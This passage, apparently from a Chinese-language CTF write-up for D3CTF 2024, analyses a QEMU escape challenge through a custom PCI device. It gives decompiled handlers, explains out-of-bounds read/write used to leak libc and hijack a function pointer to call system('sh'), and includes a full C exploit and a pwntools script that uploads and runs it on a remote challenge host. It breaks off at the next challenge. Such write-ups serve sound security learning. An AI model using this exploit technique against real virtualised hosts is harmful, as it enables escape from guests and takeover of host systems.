dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v6 + <span class="number">0xA00</span>) + addr) + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_read：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_pmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">104LL</span>, <span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++dword_123B1CC;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_mmio_write：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_n; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> addr_v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = opaque;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = value;</span><br><span class="line">  size_n = size;</span><br><span class="line">  v8 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">133LL</span>, <span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)addr;</span><br><span class="line">  addr_v7 = addr;</span><br><span class="line">  <span class="keyword">if</span> ( size_n &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v9 + size_n);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr_v7 == <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">void</span> *)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">void</span> *)v8;</span><br><span class="line">          *(_DWORD *)(v8 + <span class="number">0xA00</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_write：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_pmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  addr_v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = value;</span><br><span class="line">  n[<span class="number">0</span>] = size;</span><br><span class="line">  v9 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">173LL</span>, <span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_123B1CC )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v9 + <span class="number">0xA00</span>) + addr_v6) + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(addr_v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  addr_v10 = addr_v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * addr_v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = addr_v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr_v6 + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说实话，这道题目我看了好久才找到漏洞，还是做题做太少了。在 <code>l0dev_mmio_write</code> 函数中当 <code>addr_v7 == 0x80</code> 时我们可以对 <code>*(_DWORD *)(v8 + 0xA00)</code> 的值进行设置，而在 <code>l0dev_mmio_read</code> 函数中我们可以相对 <code>*(_DWORD *)(v8 + 0xA00)</code> 某个偏移范围内的数据进行读，在 <code>l0dev_pmio_write</code> 函数中我们可以相对 <code>*(_DWORD *)(v8 + 0xA00)</code> 某个偏移范围内的数据进行写，也就是说这里存在越界读和越界写。观察到 <code>l0dev_mmio_write</code> 函数中下面这一段代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )&#123;</span><br><span class="line">    v10 = n_4[<span class="number">0</span>];</span><br><span class="line">    addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见 <code>(int (__fastcall **)(_QWORD *))(v8 + 0xD48)</code> 处存储的是一个函数指针，通过 <code>gdb</code> 我们可以发现其存储的是 <code>rand_r</code> 函数的地址，该函数位于 <code>libc</code> 上，所以我们可以通过越界读读取此处来获取 <code>libc</code> 的地址。可以看见这个地方是通过函数指针调用了函数，且函数的参数我们是可控的，所以我们可以劫持该函数指针执行 <code>system</code> 函数的地址，然后另函数从参数为 <code>sh</code> 即可实现逃逸<br>exp：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> port_mem = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span>  <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> inl(port_mem + port); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    outl(val, port_mem + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)(mmio_mem + addr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">666</span>); <span class="comment">// dest = 666</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>, <span class="number">0x80</span>);  <span class="comment">// *(_DWORD *)(v8 + 0xA00) = 0x80</span></span><br><span class="line">    pmio_read(<span class="number">8</span>);  <span class="comment">// dword_123B1CC++</span></span><br><span class="line">    <span class="type">uint32_t</span> leak = mmio_read(<span class="number">0x8c</span>);</span><br><span class="line">    <span class="type">uint32_t</span> low_system_addr = <span class="number">0xa610</span> + leak;</span><br><span class="line">    hexx(<span class="string">&quot;low_system_addr&quot;</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x94</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// addr_v7 = system(&quot;sh&quot;) % 0x100;</span></span><br><span class="line">    mmio_write(<span class="number">0x40</span>, <span class="number">0x6873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传脚本：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;106.14.121.29&#x27;</span>, <span class="number">30537</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;# &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># send_cmd(&#x27;cd /proc/141/net&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可能用人会问，在 <code>qemu</code> 中执行 <code>system(&quot;/bin/sh&quot;)</code> 不是无法 <code>getsell</code> 的吗，执行后不会有任何回显。其实是可以 <code>getshell</code> 的，但是需要通过 <code>pwntools</code> 连接后才可以看见回显，其效果如下：  </p><img src="/2024/04/29/d3ctf2024/3.png" class="" title="我的图图呢">  <h2 id="d3note"><a href="#d3note" class="headerlink" title="d3note"></a>d3note</h2><p>题目代码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span 